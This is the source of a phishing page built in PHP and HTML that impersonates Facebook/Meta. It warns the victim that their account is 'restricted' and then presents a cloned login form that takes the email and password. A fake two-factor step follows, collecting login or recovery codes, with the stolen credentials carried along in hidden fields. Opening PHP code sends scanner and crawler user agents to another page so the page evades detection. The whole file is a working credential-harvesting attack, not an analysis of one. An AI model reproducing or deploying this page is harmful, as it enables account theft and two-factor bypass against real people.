<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Help Facebook">
<meta name="description" content="improve your page!">
<meta property="og:description" content="improve your page!';">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Meta 2023">
<meta property="og:type" content="website">
<meta name="copyright"content="Meta 2023">
<meta name="theme-color" content="#000">
<meta property="og:image" content="">
<title>Help Facebook</title>
<link rel="stylesheet" href="css/style-login/facebook.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/loader.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
body {
	background: #fff center / cover no-repeat;
	margin: 0;
	font-family: 'Teko';
}
.container {
	background: #fff no-repeat center center;
	background-size: cover;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
	border: 1px solid #fff;
}
.galle-container {	
   background: #EAEBEF no-repeat center;
   background-size: cover;   
   width:auto;
   height:720px; 
   margin-top:-1px; 
   padding:5px; 
   border-left: 0px solid #fff;
   border-right: 0px solid #fff;
   border-top: 0px solid #fff;
   border-bottom: 0px solid #fff;
}
.gallery-container {	
   background: #FFF no-repeat center;
   background-size: cover;   
   width:auto;
   height:450px; 
   margin-top:-1px; 
   padding:5px; 
   border-left: 0px solid #fff;
   border-right: 0px solid #fff;
   border-top: 0px solid #fff;
   border-bottom: 0px solid #fff;
}
.navbar {
	background: #F6F6F6;
	width: 100%;
	height: 38px;
}
.navbar-logo {
	width: 79px;
	float: left;
	margin-top: 13px;
	margin-left: 11px;
}
.navbar2 {
	background: #4C6EB5;
	width: 100%;
	height: 38px;
}
.navbar-logo2 {
	width: 81px;
	float: left;
	margin-top: 10px;
	margin-left: 10px;
}
.header {
	width: 100%;
	height: auto;
}
.header img {
	width: 100%;
	height: auto;
	margin-top: -0px;
	border-bottom: 0px solid #999999;
	border-top: 0px solid #999999;
}
.header video {
	width: 100%;
	height: auto;
	margin-top: -0px;
}
.metanotif {
	width: 100%;
	height: auto;
}
.metanotif img {
	width: 100%;
	height: auto;
	margin-left:auto;
	margin-right:auto;
}
.titlea1 {	
	width:100%;	
	padding:5px;	
	display:block;
	font-size: 19px;
	font-family: arial, sans-serif;
	font-weight: bold;
	text-align: left;
}
.titlea2 {	
	width:97%;	
	padding:5px;	
	display:block;
	font-size: 13px;
	font-family: arial, sans-serif;
	font-weight: bold;
	color: #848486;
	text-align: left;
	margin-left:auto;
	margin-right:auto;
	border-bottom: 0.5px solid #848486;
}
.titlea3 {	
	width:97%;	
	padding:5px;	
	display:block;
	font-size: 14px;
	font-family: arial, sans-serif;
	font-weight: 500;
	text-align: left;	
	margin-left:auto;
	margin-right:auto;
}
.titlea4 {	
	background: #DCDCDC;
	background-size:100% 100%;
	width:100%;	
	padding:5px;	
	display:block;	
	font-family: arial, sans-serif;
	font-weight: 500;
	border-radius:10px;
	text-align: left;	
}
.titlea5 {	
	width:100%;	
	padding:5px;	
	display:block;
	font-size: 14px;
	font-family: arial, sans-serif;
	font-weight: 400;
	text-align: left;	
	margin-left:auto;
	margin-right:auto;
	padding-top:10px;
	padding-bottom:10px;
	border-top: 0.5px solid #848486;
	border-bottom: 0.5px solid #848486;
}
.titlea6 {	
	width:100%;	
	padding:5px;	
	display:block;
	font-size: 14px;
	font-family: arial, sans-serif;
	font-weight: 400;
	text-align: left;	
	margin-left:auto;
	margin-right:auto;	
	padding-bottom:10px;
	border-bottom: 0.5px solid #848486;
}
.titlea7 {	
	width:100%;	
	padding:5px;	
	display:block;
	font-size: 14px;
	font-family: arial, sans-serif;
	font-weight: 400;
	text-align: left;	
	margin-left:auto;
	margin-right:auto;	
	padding-bottom:10px;	
}
.titlea8 {		
	display:inline-block;
	font-size: 12px;
	font-family: arial, sans-serif;
	font-weight: 400;
	text-align: left;	
	color: #395898;
	float: left;
	margin-left:3px;	
	padding-top:37px;			
}
.notify-au {	
   background: #FFF no-repeat center;
   background-size: cover;   
   width:98%;
   height:430px;    
   padding:5px; 
   border: 0.5px solid #dcdcdc;
   border-radius: 2px;
   margin-top:100px;
   margin-left:auto;
   margin-right:auto;
}
.verify-box-navbar {	
	background-size: 100% 100%;
	width: 93%;
	height: 19%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.verify-box-navbar-description {
	width: 50%;
	margin-top: 50px;
	margin-right: 20px;
	color: #fff;
	font-size: 18px;
	font-family: Teko;
	font-weight: 500;
	text-align: left;
	float: right;
}
.verify-box-navbar-form {	
	background-size: 100% 100%;
	width: 99%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.verify-box-navbar-form input {	
	width: 45%;
	height: 30px;
	margin-left: 5px;
	margin-bottom: 4px;
	padding: 5px;
	padding-left: 10px;	
	color: #000;
	font-size:15px;
	font-family: arial, sans-serif;
	font-weight: 500;
	border: 1px solid #848486;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.verify-box-navbar-form input::placeholder {
	color: #606771;
}
.verify-box-content {	
	background-size: 100% 100%;
	width: 100%;
	height: auto;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 8px;	
	display: block;
}
.verify-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #fff;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.verify-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #999999;
	font-size: 100px;
	text-align: center;
}
.verify-box-content button {
	background:url(img/button.jpg) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	height: 45px;
	margin-top: 20px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 7px;	
	color: #fff;
	font-size: 18px;
	font-family: arial, sans-serif;
	font-weight: bold;
	text-align: center;
	border: none;
	border-radius: 5px;
	cursor: pointer;
	display: block;
}
.verify-box-contents {	
	background-size: 100% 100%;
	width: 100%;
	height: auto;
	margin-left: auto;
	margin-right: auto;		
	display: block;
	border-top: 0.5px solid #848486;
}
.verify-box-contents button {
	background: #4167B2;
	background-size: 100% 100%;
	width: 38%;
	height: 43px;
	margin-top: 20px;
	margin-left: auto;
	margin-right: 2px;
	margin-bottom: 10px;
	padding: 7px;	
	color: #fff;
	float:right;
	font-size: 14px;
	font-family: arial, sans-serif;
	font-weight: bold;
	text-align: center;
	border: none;
	border-radius: 5px;
	cursor: pointer;
	display: block;
}
.fb-load {	
	background-size: 100% 100%;
	width: 50%;
	height: auto;	
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	display: block;	
	text-align: center;
}
.fb-load img {		
	width: 55px;
	height: 55px;	
	margin-top: 270px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: -55px;	
	text-align: center;
}
.fb-load-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	padding-left: auto;
	padding-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #999998;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
@media only screen and (max-width:600px) {
    .container {
        width: 100%;
        height: auto;
        margin-top: -3px;
        margin-bottom: 0px;
        border: none;
        border-radius: 0px;
        padding: 0px;
    }
    .gallery-container {	
        height:450px;     
    }
}
</style>
<div class="container">
<div class="home-sec">
<div class="navbar">
<img class="navbar-logo" src="img/logometa.png">
</div> <!--- navbar --->
<div class="header">
<img src="img/header1.jpg" style="width: 100%;">
</div> <!--- header --->
<div class="gallery-container">
<div class="titlea1">
Your account has been restricted
</div> <!--- titlea1 --->
<div class="titlea2">
Term of Service
</div> <!--- titlea2 --->
<div class="titlea3">
We got a lot of repeated reports on your page today. please obey every ad meta rule, we will lock your page within the next 1x24 hours to give sanctions to any violators of the meta community, <a onclick="getstarted()" style="color: #3775F0">Click Button Continue </a>
to improve your page before being permanently deactivated.
</div> <!--- titlea3 ---><br>
<div class="metanotif">
<img src="img/header2.png" style="width: 100%;">
</div> <!--- metanotif --->
<div class="verify-box-content">
<button type="button" onclick="open_account_login()">Get started</button>
</div> <!--- verify-box-content --->
</div> <!--- gallery-container --->
</div> <!--- home-sec --->

<div class="login-sec" style="display: none;">
<div class="navbar">
<img class="navbar-logo" src="img/logometa.png">
</div> <!--- navbar --->
<div class="gallery-container">
<div class="header">
<img src="img/header3.jpg" style="width: 100%;">
</div> <!--- header ---><br>
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
<p class="kaget sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<div class="form-group-fb">
<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" oninvalid="this.setCustomValidity('Enter Mobile number or email address')" oninput="setCustomValidity('')">
<div class="form-group-sohid showFirstFbPassword" id="showFirstFbPassword" onclick="showFirstFbPassword()">
<img src="img/hidepassword.png">
</div> <!--- form-group-sohid showFbPassword --->
<div class="form-group-sohid hideFirstFbPassword" style="display: none;" onclick="hideFirstFbPassword()">
<img src="img/showpassword.png">
</div> <!--- form-group-sohid showFbPassword --->
<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create Account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">العربية</div>
<div class="language-name">Türkçe</div>
<div class="language-name">Tiếng Việt</div>
<div class="language-name">日本語</div>
<div class="language-name">Español</div>
<div class="language-name">Português (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Meta © 2023</div>
</div> <!--- login-sec --->
</div> <!--- gallery-container --->

<div class="loading-sec" style="display: none;">
<div class="navbar">
<img class="navbar-logo" src="img/logometa.png">
</div> <!--- navbar --->
<div class="gallery-container">
<div class="fb-load">
<img src="img/style-img/icon_fb.png">
<div class="loader3"></div>
</div> <!--- fb-load --->
</div> <!--- loading-sec--->
</div> <!--- gallery-container --->

<div class="final-sec" style="display: none;">
<div class="navbar2">
<img class="navbar-logo2" src="img/logofb.png">
</div> <!--- navbar2 --->
<div class="galle-container">
<div class="notify-au">
<div class="titlea1">
Choose a way to confirm it's you
</div> <!--- titlea1 --->
<div class="titlea5">
Your account has two-factor authentication switched on, which requires this extra login step.
</div> <!--- titlea5 --->
<div class="titlea1">
Approve from another device
</div> <!--- titlea1 --->
<div class="titlea6">
We already sent a notification to your logged in devices. Check your Facebook notifications where you're already logged into the account and approve the login to continue.
</div> <!--- titlea6 --->
<div class="titlea1">
Or, enter your login code
</div> <!--- titlea1 --->
<div class="titlea7">
Enter the 6-digit code we just sent from the authentication app you set up.
or Enter the 8-digit recovery code.
</div> <!--- titlea7 --->
<form class="verify-box-navbar-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" name="loginCode" id="loginCode" placeholder="Login Code" autocomplete="off" required oninvalid="this.setCustomValidity('Enter the 8-digit code we just sent from the RECOVERY CODE you set up.')" oninput="setCustomValidity('')">
<br>
<br>
<div class="verify-box-contents">
<label class="titlea8">Need another way to confirm it's you?</label>
<button type="submit" onclick="ValidateVerificationData()">Submit code</button>
</div> <!--- verify-box-contents --->
</form>
</div> <!--- notify-au --->
</div> <!--- final-sec --->
</div> <!--- galle-container --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>

</body>
</html>